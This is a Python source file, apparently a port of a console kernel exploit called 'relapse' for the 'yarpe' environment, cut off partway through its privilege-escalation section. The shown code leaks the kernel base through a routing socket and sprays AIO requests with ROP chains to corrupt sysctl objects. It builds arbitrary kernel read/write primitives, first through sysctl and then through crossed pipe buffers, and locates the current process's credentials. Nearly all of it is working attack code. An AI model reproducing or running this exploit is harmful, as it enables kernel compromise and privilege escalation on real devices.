"""
relapse for yarpe - port by PLK

Credits: ntfargo, ufm42, Sonic_Iso, Jordy, Dr. YenYen, TheFlow, SlidyBat,
Flatz, cow, nhk, bollarz, Sleirsgoevy, EchoStretch, EarthOnion, notmaj0r
"""

import gc
import os
import struct
import sys

_AUTOLOAD_DIR = "/saves/yarpe_autoload"
if os.path.isdir(_AUTOLOAD_DIR) and _AUTOLOAD_DIR not in sys.path:
    sys.path.append(_AUTOLOAD_DIR)

from sc import sc
from utils.etc import alloc
from utils.ref import get_ref_addr
from utils.unsafe import readbuf, writebuf
from utils.conversion import u64_to_i64, u32_to_i32
from utils.rp import log
from ropchain import Executable
from constants import SHARED_VARS, SYSCALL, nogc

import kexp
from relapse_offsets import get_relapse_offset

# ---- constants -----------------------------------------------------------

IGNORE_STATE_CHECKS = True

RESTORE_ESCALATION = True
RESTORE_DYNLIB_RANGE = True
RESTORE_FD_CDIR_RDIR = False

AF_UNIX = 1
AF_INET = 2
AF_ROUTE = 17
AF_INET6 = 28
SOCK_STREAM = 1
SOCK_RAW = 3

MSG_DONTWAIT = 0x80
RLIMIT_NOFILE = 8
CPU_LEVEL_WHICH = 3
CPU_WHICH_TID = 1
RTP_SET = 1
PRI_REALTIME = 2
PRI_NORMAL = 3
AIO_CMD_READ = 1

SOCKOPT_SOL_SOCKET = 0xFFFF
SO_RCVTIMEO = 0x20  # SO_RCVTIMEO container when level is 0xffff

PROT_RWX = 0x7
O_NONBLOCK_FLAG = 0x4
F_SETFL = 4
LIBC_HANDLE = 2
M64 = 0xFFFFFFFFFFFFFFFF
M32 = 0xFFFFFFFF

SYSCALL.update(
    {
        "getpid": 0x14,
        "recvfrom": 0x1D,
        "ioctl": 0x36,
        "munmap": 0x49,
        "socketpair": 0x87,
        "getrlimit": 0xC2,
        "setrlimit": 0xC3,
        "cpuset_getaffinity": 0x1E7,
        "cpuset_setaffinity": 0x1E8,
        "rtprio_thread": 0x1D2,
        "mmap": 0x1DD,
        "fcntl": 0x5C,
        "jitshm_create": 0x215,
        "jitshm_alias": 0x216,
        "aio_multi_wait": 0x297,
        "aio_multi_poll": 0x298,
        "aio_multi_cancel": 0x29A,
        "aio_submit_cmd": 0x29D,
        "nanosleep": 0xF0,
    }
)

# ---- exploit state -------------------------------------------------------

off = None
kbase = 0
curproc_addr = 0
ucred_addr = 0
proc_fd_addr = 0
master = None
victim = None
fds = []
window_high = M32
armed_groups = []
mib_a = None
mib_b = None
mib_c = None
pipe_size = 0
saved_pipe_buffers = None
pipes_disarmed = False
aim_buffer = None
drain_buffer = None
crossed = False
defused = False
handed_off = False
eboot_segments_ptr = 0
eboot_orig_addr = 0
eboot_orig_size = 0
escalation_orig = None
escalation_restored = False
worker_park = None
pinned_core = -1
allowed_mask = 0
thread_attrs_restored = False

scratch_states = alloc(0x400)
scratch_qword = alloc(8)

tuning = {
    "waiters": 18,
    "requests": 13,
    "churnBefore": 32,
    "churnAfter": 256,
    "sprays": 64,
    "workerBlockers": 24,
    "waitTimeoutUs": 10000,
}

sysctl_mib_buf = alloc(0x40)
sysctl_len_buf = alloc(8)
sysctl_value_buf = alloc(8)


# ---- helpers -------------------------------------------------------------


def report(tag, detail=None):
    log("[-] " + (detail or tag))


def stage(message):
    log("[*] " + message)


def ok_msg(message):
    log("[+] " + message)


def sysint(fn, *args):
    return u64_to_i64(fn(*args))


def is_kernel_pointer(value):
    top16 = (value >> 48) & 0xFFFF
    low_aligned = (value & 7) == 0
    all_ones = value == M64
    return top16 == 0xFFFF and low_aligned and not all_ones


def kaddr(rva):
    return (kbase + rva) & M64


def concat_mib(a, b):
    return list(a) + list(b)


def clear_buffer(buf, size):
    buf[0:size] = b"\x00" * size


def p32(buf, index, value):
    buf[index : index + 4] = struct.pack("<I", value & M32)


def p64(buf, index, value):
    buf[index : index + 8] = struct.pack("<Q", value & M64)


def u32(buf, index):
    return struct.unpack("<I", buf[index : index + 4])[0]


def q64(buf, index):
    return struct.unpack("<Q", buf[index : index + 8])[0]


def msleep(msec):
    req = alloc(16)
    p64(req, 0, msec // 1000)
    p64(req, 8, (msec % 1000) * 1000000)
    sc.syscalls.nanosleep(req)


# ---- thread affinity -----------------------------------------------------


def pin_to_single_core():
    global allowed_mask, pinned_core
    current = alloc(0x10)
    sc.syscalls.cpuset_getaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, M64, 0x10, current)
    allowed = u32(current, 0)
    allowed_mask = allowed

    core = -1
    for c in range(16):
        if allowed & (1 << c):
            core = c
            break
    if core < 0:
        report("PIN", "no allowed core in mask %#x" % allowed)
        return

    mask = alloc(0x10)
    mask[(core >> 3) & 0xF : ((core >> 3) & 0xF) + 1] = struct.pack(
        "<B", 1 << (core & 7)
    )
    sc.syscalls.cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, M64, 0x10, mask)

    rtprio = alloc(0x10)
    rtprio[0:1] = struct.pack("<B", PRI_REALTIME)
    sc.syscalls.rtprio_thread(RTP_SET, 0, rtprio)

    pinned_core = core


def restore_thread_attributes():
    global thread_attrs_restored
    if thread_attrs_restored:
        return

    global allowed_mask
    want = allowed_mask
    if not want or want == 0:
        want = 0xEA00

    mask = alloc(0x10)
    mask[0:1] = struct.pack("<B", want & 0xFF)
    mask[1:2] = struct.pack("<B", (want >> 8) & 0xFF)
    sc.syscalls.cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, M64, 0x10, mask)

    rtprio = alloc(0x10)
    rtprio[0:1] = struct.pack("<B", PRI_NORMAL)
    sc.syscalls.rtprio_thread(RTP_SET, 0, rtprio)

    thread_attrs_restored = True


# ---- sysctl --------------------------------------------------------------


def do_sysctl(mib, old_ptr, old_len, new_ptr, new_len):
    for i, value in enumerate(mib):
        p32(sysctl_mib_buf, i * 4, value)
        sysctl_mib_buf[i * 4 + 4 : i * 4 + 8] = b"\x00\x00\x00\x00"
    sysctl_len_buf[0:8] = b"\x00" * 8
    p32(sysctl_len_buf, 0, old_len or 0)

    rv = sysint(
        sc.syscalls.sysctl,
        sysctl_mib_buf,
        len(mib),
        get_ref_addr(old_ptr) if old_ptr else 0,
        get_ref_addr(sysctl_len_buf) if old_ptr else 0,
        get_ref_addr(new_ptr) if new_ptr else 0,
        new_len or 0,
    )
    ln = 0
    if old_ptr:
        ln = u32(sysctl_len_buf, 0)
    return rv, ln


def sysctl_read_int(mib):
    rv, _ = do_sysctl(mib, sysctl_value_buf, 4, None, 0)
    return rv, u32(sysctl_value_buf, 0)


def sysctl_write_int(mib, value):
    p32(sysctl_value_buf, 0, value)
    rv, _ = do_sysctl(mib, None, 0, sysctl_value_buf, 4)
    return rv


def name_to_mib(name):
    name_bytes = name.encode()
    name_buf = alloc(len(name_bytes) + 1)
    name_buf[0 : len(name_bytes)] = name_bytes
    out = alloc(0x60)
    rv, ln = do_sysctl([0, 3], out, 0x60, name_buf, len(name_bytes))
    if rv != 0:
        return None

    mib = []
    for i in range(ln // 4):
        mib.append(u32(out, i * 4))
    return mib


def oid_kind(mib):
    out = alloc(0x100)
    rv, _ = do_sysctl(concat_mib([0, 4], mib), out, 0x100, None, 0)
    if rv != 0:
        return None
    return u32(out, 0)


# ---- kaslr ---------------------------------------------------------------


def first_interface_address():
    interfaces = sc.get_all_network_interfaces()
    preferred = None
    iface_names = sorted(interfaces.keys())
    for name in iface_names:
        ip = interfaces[name]
        if ip in ("0.0.0.0", "127.0.0.1") or not ip:
            continue
        if preferred is None:
            preferred = ip
        if name in ("eth0", "wlan0"):
            preferred = ip
            break

    if not preferred:
        return None

    return [int(o) for o in preferred.split(".")]


def sockaddr_len(ln):
    if ln and ln != 0:
        return ((ln - 1) & ~7) + 8
    return 8


def leak_kernel_base():
    global kbase, off
    dst_len = 88
    author_offset = 152 + sockaddr_len(dst_len)
    msg_len = author_offset + 256
    author_index = 6
    ret_slot = 184

    dst = first_interface_address()
    if not dst:
        raise Exception("kaslr: no interface has an address")

    fd = sysint(sc.syscalls.socket, AF_ROUTE, SOCK_RAW, 0)
    if fd < 0:
        raise Exception("kaslr: routing socket is gated")
    fds.append(fd)

    timeout = alloc(16)
    p32(timeout, 0, 5)
    sysint(sc.syscalls.setsockopt, fd, SOCKOPT_SOL_SOCKET, SO_RCVTIMEO, timeout, 16)

    msg = alloc(512)
    msg[0:1] = struct.pack("<B", msg_len & 0xFF)
    msg[1:2] = struct.pack("<B", (msg_len >> 8) & 0xFF)
    msg[2:3] = b"\x05"  # rtm_version
    msg[3:4] = b"\x04"  # rtm_get
    p32(msg, 12, 0x41)  # rta_dst | rta_author
    p32(msg, 20, 0x1234)  # rtm_seq
    msg[152:153] = struct.pack("<B", dst_len)
    msg[153:154] = struct.pack("<B", AF_INET)
    ip = ((dst[3] & M32) << 24) | ((dst[2]) << 16) | ((dst[1]) << 8) | dst[0]
    p32(msg, 156, ip)
    msg[author_offset : author_offset + 1] = struct.pack("<B", 255)
    msg[author_offset + 1 : author_offset + 2] = struct.pack("<B", AF_INET6)

    if sysint(sc.syscalls.write, fd, msg, msg_len) < 0:
        raise Exception("kaslr: routing socket rejected the request")

    reply = alloc(4096)
    ln = 0
    for _ in range(8):
        ln = sysint(sc.syscalls.recvfrom, fd, reply, 4096, MSG_DONTWAIT, 0, 0)
        if ln > 0:
            break
        msleep(1)
    if ln <= 0:
        raise Exception("kaslr: no routing reply")

    present = u32(reply, 12)
    cursor = 152
    author = 0
    for i in range(8):
        if present & (1 << i):
            if cursor + 2 > ln:
                break
            if i == author_index:
                author = cursor
                break
            cursor += sockaddr_len(reply[cursor])
    if author == 0 or author + 200 > ln:
        raise Exception("kaslr: reply carries no author record")

    ret = q64(reply, author + ret_slot)
    kaslr = off["kaslr"]
    if (ret >> 48) != 0xFFFF or (ret & 0xFFFF) != (kaslr["retLow16"] & 0xFFFF):
        raise Exception(
            "kaslr: author+%d = %#x is not the expected return address"
            % (ret_slot, ret)
        )

    kbase = (ret - kaslr["retStatic"]) & M64


# ---- aio reclaim ---------------------------------------------------------


def raise_fd_limit():
    limit = alloc(0x10)
    if sysint(sc.syscalls.getrlimit, RLIMIT_NOFILE, limit) == -1:
        return
    limit[0:8] = limit[8:16]
    sysint(sc.syscalls.setrlimit, RLIMIT_NOFILE, limit)


def open_socket_pair(error_message):
    buffer = alloc(8)
    if sysint(sc.syscalls.socketpair, AF_UNIX, SOCK_STREAM, 0, buffer) == -1:
        raise Exception(error_message)
    global fds
    pair = {"read_fd": u32(buffer, 0), "write_fd": u32(buffer, 4)}
    fds.append(pair["read_fd"])
    fds.append(pair["write_fd"])
    return pair


def submit_blocked_read(read_fd):
    request = alloc(0x40)
    sink = alloc(0x40)
    id_out = alloc(8)

    p32(request, 0x08, 1)
    p64(request, 0x10, get_ref_addr(sink))
    p32(request, 0x20, read_fd)

    rv = sysint(
        sc.syscalls.aio_submit_cmd, AIO_CMD_READ, request, 1, 3, id_out
    )
    if rv == 0:
        return u32(id_out, 0)
    return None


def park_aio_workers(limit):
    global worker_park
    pair = open_socket_pair("socketpair for the worker park failed")
    worker_park = pair

    ids = alloc(4 * limit + 8)
    states = alloc(4 * limit + 8)

    sent = 0
    parked = 0
    quiet_rounds = 0
    while sent < limit and quiet_rounds < 2:
        for _ in range(4):
            if sent >= limit:
                break
            id_ = submit_blocked_read(pair["read_fd"])
            if id_ is None:
                return
            p32(ids, sent * 4, id_)
            sent += 1

        msleep(60)
        sysint(sc.syscalls.aio_multi_poll, ids, sent, states)

        in_flight = 0
        for i in range(sent):
            if u32(states, i * 4) & 0xFFFF == 2:
                in_flight += 1

        if in_flight == parked:
            quiet_rounds += 1
        else:
            parked = in_flight
            quiet_rounds = 0


def wait_for_pending_requests(candidate_ids, candidate_count, wanted_count):
    poll_id = alloc(4)
    poll_state = alloc(4)
    pending_indices = []
    seen = {}

    for _ in range(150):
        if len(pending_indices) >= wanted_count:
            break
        for index in range(candidate_count):
            if len(pending_indices) >= wanted_count:
                break
            if index not in seen:
                poll_id[0:4] = candidate_ids[index * 4 : index * 4 + 4]
                sysint(sc.syscalls.aio_multi_poll, poll_id, 1, poll_state)
                if u32(poll_state, 0) & 0xFFFF == 1:
                    pending_indices.append(index)
                    seen[index] = True
        if len(pending_indices) < wanted_count:
            msleep(20)

    if len(pending_indices) != wanted_count:
        raise Exception(
            "%d/%d requests stayed pending" % (len(pending_indices), wanted_count)
        )
    return pending_indices


def claim_pending_requests(count):
    global fds
    candidate_count = max(count + 8, 0x18)
    candidate_ids = alloc(4 * candidate_count)

    for index in range(candidate_count):
        pair = open_socket_pair("socketpair failed while claiming requests")
        id_ = submit_blocked_read(pair["read_fd"])
        if id_ is None:
            raise Exception("aio request submission failed")
        p32(candidate_ids, index * 4, id_)

    stage("claim: waiting for %d pending" % count)
    pending = wait_for_pending_requests(candidate_ids, candidate_count, count)
    stage("claim: %d resolved" % len(pending))

    ids = alloc(4 * count)
    for output, index in enumerate(pending):
        ids[output * 4 : output * 4 + 4] = candidate_ids[index * 4 : index * 4 + 4]

    return {"ids": ids, "count": count}


def build_waiter_nodes(count, first_target, second_target):
    request_size = off["aio"]["requestSize"]
    nodes = alloc(count * request_size)
    for i in range(count):
        p32(nodes, i * request_size + 0x20, M32)
    p64(nodes, 0, first_target)
    p64(nodes, 8, second_target)
    p64(nodes, 0x10, kaddr(off["nodeMutex"]))
    return nodes


def remember_armed_group(group):
    global armed_groups
    ids = []
    for index in range(group["count"]):
        ids.append(u32(group["ids"], index * 4))
    armed_groups.append(ids)


reclaim_exec = None


def get_reclaim_executable():
    global reclaim_exec
    if reclaim_exec is None:
        reclaim_exec = Executable(sc, 0x30000)
        nogc.append(reclaim_exec)
        nogc.append(reclaim_exec.chain.chain)
        nogc.append(reclaim_exec.call_contextbuf)
        nogc.append(reclaim_exec.call_functype)
    return reclaim_exec


def run_reclaim_batch(group, nodes):
    requests = tuning["requests"]
    request_size = off["aio"]["requestSize"]
    sprays = tuning["sprays"]
    churn_before = tuning["churnBefore"]
    churn_after = tuning["churnAfter"]

    sprayed_ids = alloc(4 * requests * (sprays + 1))
    timeout = alloc(16)
    p32(timeout, 0, tuning["waitTimeoutUs"])

    churn_request = 0x80000000 | (requests * request_size << 16) | 0x4101

    group_ids_addr = get_ref_addr(group["ids"])

    stage("reclaim preflight (ioctls on fd -1)")
    preflight = sysint(sc.syscalls.ioctl, M64, churn_request, nodes)
    if preflight != -1:
        report("reclaim", "invalid churn request %d" % preflight)
        return None
    stage("reclaim preflight ok")

    executable = get_reclaim_executable()
    chain = executable.chain
    chain.reset()
    executable.setup_front_chain()

    for _ in range(churn_before):
        chain.push_syscall(SYSCALL["ioctl"], M64, churn_request, get_ref_addr(nodes))

    chain.push_syscall(
        SYSCALL["aio_multi_wait"],
        group_ids_addr,
        group["count"],
        get_ref_addr(scratch_states),
        0,
        get_ref_addr(timeout),
    )

    for _ in range(churn_after):
        chain.push_syscall(SYSCALL["ioctl"], M64, churn_request, get_ref_addr(nodes))

    spray_returns = alloc(8 * sprays)
    spray_returns_addr = get_ref_addr(spray_returns)
    for i in range(sprays):
        ret_addr = spray_returns_addr + i * 8
        chain.push_syscall(
            SYSCALL["aio_submit_cmd"],
            AIO_CMD_READ,
            get_ref_addr(nodes),
            requests,
            3,
            get_ref_addr(sprayed_ids) + i * 4 * requests,
        )
        chain.push_store_rax_into_memory(ret_addr)

    executable.setup_padding_chain()
    executable.setup_post_chain()
    executable.setup_back_chain()
    stage("executing reclaim chain")
    executable.execute()
    stage(
        "reclaim chain executed, rv=%#x errno=%d"
        % (executable.chain.return_value, executable.errno)
    )

    accepted = 0
    for i in range(sprays):
        if u32(spray_returns, i * 8) == 0:
            accepted += 1
    stage("reclaim accepted %d/%d" % (accepted, sprays))
    return accepted


def cancel_request(group, index):
    return sysint(
        sc.syscalls.aio_multi_cancel,
        get_ref_addr(group["ids"]) + index * 4,
        1,
        get_ref_addr(scratch_states),
    )


def first_pending_request(group):
    stage("first_pending_request: polling")
    sysint(
        sc.syscalls.aio_multi_poll,
        get_ref_addr(group["ids"]),
        group["count"],
        get_ref_addr(scratch_states),
    )
    for index in range(group["count"]):
        state = u32(scratch_states, index * 4) & 0xFFFF
        if state == 1:
            canary = group["count"] - 1
            if canary != index:
                cancel_request(group, canary)
            return index
    return -1


def reclaim_waiter_array(tag, first_target, second_target):
    global off
    stage("reclaim_waiter_array (%s): claiming pending requests" % tag)
    group = claim_pending_requests(tuning["waiters"])
    remember_armed_group(group)

    nodes = build_waiter_nodes(tuning["requests"], first_target, second_target)
    accepted = run_reclaim_batch(group, nodes)
    if accepted is None:
        report(tag, "invalid churn request")
        return None
    if accepted != tuning["sprays"]:
        report(tag, "%d reclaim submits failed" % (tuning["sprays"] - accepted))
        return None

    stage("reclaim_waiter_array (%s): querying first pending request" % tag)
    first_pending = first_pending_request(group)
    if first_pending < 0:
        report(tag, "no pending request is available")
        return None

    stage("reclaim_waiter_array (%s): first pending is %d" % (tag, first_pending))
    return {
        "group": group,
        "first_pending": first_pending,
        "heads": group["count"] - 1,
    }


def flip_oid_kind(tag, reclaim, mib, target):
    kind = oid_kind(mib)
    if kind is None:
        report(tag, "oid is hidden before the flip")
        return False

    stage("flip_oid_kind (%s): starting flip, kind=%#x, target=%#x" % (tag, kind, target))
    i = 0
    while i < reclaim["heads"] and kind != target:
        cancel_request(reclaim["group"], i)
        next_kind = oid_kind(mib)
        if next_kind is None:
            report(tag, "oid disappeared during the flip")
            return False
        kind = next_kind
        if (kind >> 24) & 0xFF < (target >> 24) & 0xFF:
            report(tag, "oid flip overshot into oid_arg1")
            return False
        i += 1

    if kind != target:
        report(tag, "not enough waiter heads")
        return False
    stage("flip_oid_kind (%s): flip succeeded" % tag)
    return True


def make_oid_writable(tag, mib, kind_byte_rva):
    global off
    a = off["oid"]["a"]
    kind = oid_kind(mib)
    if kind != off["oid"]["originalKind"]:
        report(
            tag,
            "unexpected oid kind %s"
            % ("missing" if kind is None else "%#x" % kind),
        )
        if not IGNORE_STATE_CHECKS:
            return False

    reclaim = reclaim_waiter_array(tag, kaddr(a["deadSink"]), kaddr(kind_byte_rva))
    if not reclaim:
        return False
    return flip_oid_kind(tag, reclaim, mib, off["oid"]["writableKind"])


# ---- slow kernel read/write ---------------------------------------------


def set_window_low(value):
    return sysctl_write_int(mib_a, value & M32)


def set_window_high(value):
    global window_high, off
    if mib_c:
        return sysctl_write_int(mib_c, value & M32)
    if window_high != M32:
        return -1

    b = off["oid"]["b"]
    self_high = kaddr(b["arg1"] + 4)
    rv = set_window_low(self_high & M32)
    if rv != 0:
        return rv
    return sysctl_write_int(mib_b, value & M32)


def aim_window(address):
    global window_high
    high = (address >> 32) & M32
    if window_high != high:
        rv = set_window_high(high)
        if rv != 0:
            return rv
        window_high = high
    return set_window_low(address & M32)


def kread32(address):
    if aim_window(address) != 0:
        return -1, 0
    return sysctl_read_int(mib_b)


def kwrite32(address, value):
    if aim_window(address) != 0:
        return -1
    return sysctl_write_int(mib_b, value & M32)


def kread64(address):
    rv_lo, lo = kread32(address)
    rv_hi, hi = kread32(address + 4)
    rv = 0 if (rv_lo == 0 and rv_hi == 0) else -1
    return rv, ((hi & M32) << 32) | (lo & M32)


def kwrite64(address, value):
    for i in range(2):
        rv = kwrite32(address + i * 4, (value >> (i * 32)) & M32)
        if rv != 0:
            return rv
    return 0


def prepare_high_writer():
    global mib_c, off
    c = off["oid"]["c"]
    b = off["oid"]["b"]
    if window_high != M32:
        report("kernel rw", "writer window already left the kernel image")
        if not IGNORE_STATE_CHECKS:
            return False
    if kwrite32(kaddr(c["kind"]), off["oid"]["writableKind"]) != 0:
        return False
    if kwrite64(kaddr(c["arg1"]), kaddr(b["arg1"] + 4)) != 0:
        return False

    probe_rv, probe_value = sysctl_read_int(c["mib"])
    if probe_rv != 0 or (probe_value & M32) != M32:
        report("kernel rw", "high writer self-test failed")
        return False
    mib_c = c["mib"]
    return True


def steer_oid_window():
    global window_high, off
    a = off["oid"]["a"]
    b = off["oid"]["b"]
    if oid_kind(mib_b) is not None:
        report("Kernel", "oid is already visible")
        if not IGNORE_STATE_CHECKS:
            return False

    a_rv, _ = sysctl_read_int(mib_a)
    if a_rv != 0:
        report("Kernel", "steering oid is not readable")
        return False

    reclaim = reclaim_waiter_array("Kernel", kaddr(a["arg1Byte1"]), kaddr(b["visible"]))
    if not reclaim:
        return False

    _ = cancel_request(reclaim["group"], reclaim["first_pending"])

    steered_rv, steered_value = sysctl_read_int(mib_a)
    expected = kaddr(b["arg1Value"]) & M32
    if steered_rv != 0 or (steered_value & M32) != expected:
        report("Kernel", "oid steering check failed")
        return False

    window_high = M32
    return True


def test_kernel_read():
    global off
    b = off["oid"]["b"]
    kind_via_oidfmt = oid_kind(mib_b)
    read_rv, read_value = kread32(kaddr(b["kind"]))
    ok_flag = (
        kind_via_oidfmt is not None and read_rv == 0 and read_value == kind_via_oidfmt
    )
    if not ok_flag:
        report("Kernel", "read self-test failed")
    return ok_flag


def test_kernel_write():
    global off
    counter = kaddr(off["walkCounter"]["addr"])
    mib = off["walkCounter"]["mib"]
    before_rv, before_value = sysctl_read_int(mib)
    rv = kwrite32(counter, 0x41424344)
    after_rv, after_value = sysctl_read_int(mib)
    ok_flag = rv == 0 and (after_value & M32) == 0x41424344
    if ok_flag:
        kwrite32(counter, before_value & M32)
    else:
        report("Kernel", "write self-test failed")
    return ok_flag


def arm_kernel_read_write():
    global mib_a, mib_b, off
    a = off["oid"]["a"]
    b = off["oid"]["b"]

    mib_a = name_to_mib("kern.smp.cpus")
    mib_b = name_to_mib("kern.smp.maxcpus")
    if not mib_a or not mib_b:
        report("Kernel", "oid lookup failed")
        return False
    if oid_kind(mib_a) != off["oid"]["originalKind"]:
        report("Kernel", "unexpected oid state")
        if not IGNORE_STATE_CHECKS:
            return False

    raise_fd_limit()
    stage("workers parking")
    park_aio_workers(tuning["workerBlockers"])
    stage("workers parked")

    if not make_oid_writable("arm a", mib_a, a["kindByte3"]):
        return False
    stage("arming a done")
    if not steer_oid_window():
        return False
    stage("steering done")
    if not test_kernel_read():
        return False
    stage("read test done")
    if not make_oid_writable("arm c", mib_b, b["kindByte3"]):
        return False
    stage("arming c done")
    if not test_kernel_write():
        return False
    stage("write test done")

    return prepare_high_writer()


# ---- process discovery ---------------------------------------------------


def read_kernel_pointer_slow(address):
    rv, value = kread64(address)
    if rv == 0 and is_kernel_pointer(value):
        return value
    return None


def find_process(target_pid):
    head = read_kernel_pointer_slow(kaddr(off["allproc"]))
    if not head:
        report("Process", "allproc is not a kernel pointer")
        return None

    proc = head
    for _ in range(4096):
        rv, pid_raw = kread32(proc + off["proc"]["pid"])
        if rv != 0:
            return None
        pid_value = u32_to_i32(pid_raw)
        if pid_value < 0 or pid_value > 0x40000:
            report("Process", "invalid pid while walking allproc")
            return None
        if pid_value == target_pid:
            return proc

        next_proc = read_kernel_pointer_slow(proc)
        if not next_proc:
            return None
        proc = next_proc
    return None


def find_current_process():
    global curproc_addr, ucred_addr, proc_fd_addr
    my_pid = sysint(sc.syscalls.getpid)
    proc = find_process(my_pid)
    if not proc:
        report("Process", "current process is not in allproc")
        return False

    curproc_addr = proc

    _, fd_value = kread64(curproc_addr + off["proc"]["fd"])
    if is_kernel_pointer(fd_value):
        proc_fd_addr = fd_value

    aio_rv, aio_info_value = kread64(curproc_addr + off["proc"]["aioInfo"])
    _, ucred_value = kread64(curproc_addr + off["proc"]["ucred"])
    if is_kernel_pointer(ucred_value):
        ucred_addr = ucred_value

    ok_flag = aio_rv == 0 and is_kernel_pointer(aio_info_value)
    if ok_flag:
        ok_msg("aio_info_addr: %#x" % aio_info_value)
    else:
        report("Process", "aio info pointer is invalid")
    if ucred_addr:
        ok_msg("ucred_addr: %#x" % ucred_addr)
    return ok_flag


# ---- fast kernel read/write ---------------------------------------------


def find_pipe(fdp, fd, label):
    table_addr = read_kernel_pointer_slow(fdp + off["filedesc"]["files"])
    if not table_addr:
        report("Pipes", label + " file table is invalid")
        return None

    count_rv, count_value = kread32(table_addr + off["filedescTable"]["nfiles"])
    if count_rv != 0 or fd >= count_value:
        report("Pipes", label + " descriptor is outside the file table")
        return None

    entry = off["filedescTable"]["ofiles"] + fd * off["filedescTable"]["entryStride"]
    file_addr = read_kernel_pointer_slow(table_addr + entry)
    if not file_addr:
        report("Pipes", label + " file pointer is invalid")
        return None

    pipe_addr = read_kernel_pointer_slow(file_addr + off["filedescTable"]["fileData"])
    if not pipe_addr:
        report("Pipes", label + " pipe pointer is invalid")
        return None

    pair_rv, pair_value = kread64(pipe_addr + off["pipe"]["pair"])
    is_read_end = pair_rv == 0 and pair_value == pipe_addr

    return {"file": file_addr, "pipe": pipe_addr, "is_read_end": is_read_end}


def create_pipe():
    fildes = alloc(0x10)
    if u64_to_i64(sc.syscalls.pipe(fildes)) == -1:
        raise Exception(
            "create_pipe error: %d\n%s"
            % (sc.syscalls.pipe.errno, sc.syscalls.pipe.get_error_string())
        )
    global fds
    pipe_read_fd = struct.unpack("<I", fildes[0:4])[0]
    pipe_write_fd = struct.unpack("<I", fildes[4:8])[0]
    fds.append(pipe_read_fd)
    fds.append(pipe_write_fd)
    return pipe_read_fd, pipe_write_fd


def locate_pipes():
    global master, victim
    fdp = read_kernel_pointer_slow(curproc_addr + off["proc"]["fd"])
    if not fdp:
        report("Pipes", "process file table is invalid")
        return False

    probe = alloc(8)
    located = []

    for label in ("master", "victim"):
        read_fd, write_fd = create_pipe()
        sysint(sc.syscalls.fcntl, read_fd, F_SETFL, O_NONBLOCK_FLAG)
        sysint(sc.syscalls.fcntl, write_fd, F_SETFL, O_NONBLOCK_FLAG)

        info = find_pipe(fdp, read_fd, label)
        if not info:
            return False
        if not info["is_read_end"]:
            report("Pipes", label + " pipe self-check failed")
            return False

        probe[0:4] = struct.pack("<I", 0x5A)
        sysint(sc.syscalls.write, write_fd, probe, 1)

        _, count_value = kread32(info["pipe"] + off["pipe"]["count"])
        if count_value != 1:
            report("Pipes", label + " pipe counter check failed")
            return False

        write_info = find_pipe(fdp, write_fd, label)
        if not write_info:
            return False

        located.append(
            {
                "read_fd": read_fd,
                "write_fd": write_fd,
                "pipe": info["pipe"],
                "read_file": info["file"],
                "write_file": write_info["file"],
            }
        )

    master = located[0]
    victim = located[1]
    return True


def aim_victim(address, count, size):
    c = off["pipe"]["count"]
    s = off["pipe"]["size"]
    b = off["pipe"]["buffer"]
    clear_buffer(aim_buffer, 0x18)
    p32(aim_buffer, c, count)
    p32(aim_buffer, s, size)
    p64(aim_buffer, b, address)

    written = sysint(
        sc.syscalls.write, master["write_fd"], aim_buffer, 0x18
    )
    drained = sysint(sc.syscalls.read, master["read_fd"], drain_buffer, 0x18)
    return 0 if (written == 0x18 and drained == 0x18) else -1


def kread_fast(address, length, dest):
    if aim_victim(address, length, pipe_size) != 0:
        return -1
    return sysint(sc.syscalls.read, victim["read_fd"], dest, length)


def kwrite_fast(address, length, src):
    if aim_victim(address, 0, pipe_size) != 0:
        return -1
    return sysint(sc.syscalls.write, victim["write_fd"], src, length)


def read_kernel32(address):
    if kread_fast(address, 4, scratch_qword) == 4:
        return u32(scratch_qword, 0)
    return -1


def read_kernel64(address):
    if kread_fast(address, 8, scratch_qword) == 8:
        return q64(scratch_qword, 0)
    return 0


def write_kernel32(address, value):
    p32(scratch_qword, 0, value)
    return kwrite_fast(address, 4, scratch_qword) == 4


def write_kernel64(address, value):
    p64(scratch_qword, 0, value)
    return kwrite_fast(address, 8, scratch_qword) == 8


def cross_pipes():
    global pipe_size, aim_buffer, drain_buffer, saved_pipe_buffers
    global crossed, off
    master_pipe = master["pipe"]
    victim_pipe = victim["pipe"]
    count_off = off["pipe"]["count"]
    in_off = off["pipe"]["in"]
    out_off = off["pipe"]["out"]
    size_off = off["pipe"]["size"]
    buffer_off = off["pipe"]["buffer"]

    pipe_size = off["pipe"]["defaultSize"]
    aim_buffer = alloc(0x20)
    drain_buffer = alloc(0x40)

    master_rv, master_buffer = kread64(master_pipe + buffer_off)
    master_size_rv, master_size = kread32(master_pipe + size_off)
    victim_rv, victim_buffer = kread64(victim_pipe + buffer_off)
    victim_size_rv, victim_size = kread32(victim_pipe + size_off)
    if (
        master_rv != 0
        or master_size_rv != 0
        or victim_rv != 0
        or victim_size_rv != 0
    ):
        report("Pipes", "could not save the original pipe buffers")
        return False

    saved_pipe_buffers = {
        "master": master_buffer,
        "master_size": master_size,
        "victim": victim_buffer,
        "victim_size": victim_size,
    }

    in_rv, in_value = kread32(master_pipe + in_off)
    _, out_value = kread32(master_pipe + out_off)
    if in_rv != 0 or in_value != 1 or out_value != 0:
        report("pipes", "master pipe is not in the expected state")
        return False
    sysint(sc.syscalls.read, master["read_fd"], drain_buffer, 1)

    fields = [
        (count_off, 0),
        (in_off, 0),
        (out_off, 0),
        (size_off, pipe_size),
        (buffer_off, victim_pipe & M32),
        (buffer_off + 4, (victim_pipe >> 32) & M32),
    ]
    for field_offset, value in fields:
        ok_flag = False
        for _ in range(3):
            if ok_flag:
                break
            kwrite32(master_pipe + field_offset, value)
            read_rv, read_value = kread32(master_pipe + field_offset)
            ok_flag = read_rv == 0 and read_value == (value & M32)
        if not ok_flag:
            report("Pipes", "could not update the master pipe")
            return False
    crossed = True

    rva = off["rodataProbe"]["rva"]
    text = off["rodataProbe"]["text"].encode("utf-8")
    out = alloc(0x40)
    got = kread_fast(kaddr(rva), len(text), out)
    read_back = bytearray(out[0 : len(text)])

    match = got == len(text) and read_back == bytearray(text)
    if not match:
        report("Pipes", "kernel read check failed")
    return match


# ---- privileges ----------------------------------------------------------


def snapshot_escalation():
    global escalation_orig
    proc = off["proc"]
    filedesc = off["filedesc"]
    dynlib = off["dynlib"]

    def read64_at(address):
